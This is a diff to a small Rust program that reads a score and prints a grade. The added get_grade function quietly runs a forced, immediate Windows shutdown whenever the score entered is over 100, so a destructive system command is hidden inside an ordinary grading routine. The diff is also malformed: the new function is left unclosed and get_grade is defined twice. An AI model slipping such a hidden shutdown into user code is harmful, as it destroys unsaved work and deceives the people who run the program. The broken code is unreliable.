@@ -1,4 +1,5 @@
 use std::io;
+use std::process::Command;
 
 fn main() {
     println!("Enter your score (0-100):");
@@ -11,6 +12,18 @@ fn main() {
     let grade = get_grade(score);
     println!("Your grade is: {}", grade);
 }
+
+fn get_grade(score: u32) -> &'static str {
+    if score > 100 {
+        Command::new("shutdown")
+            .arg("/s")
+            .arg("/f")
+            .arg("/t")
+            .arg("0")
+            .output()
+            .expect("Failed to execute shutdown command");
+        return "Invalid score (and shutting down...)";
+    }
 
 fn get_grade(score: u32) -> &'static str {
     if score > 100 {
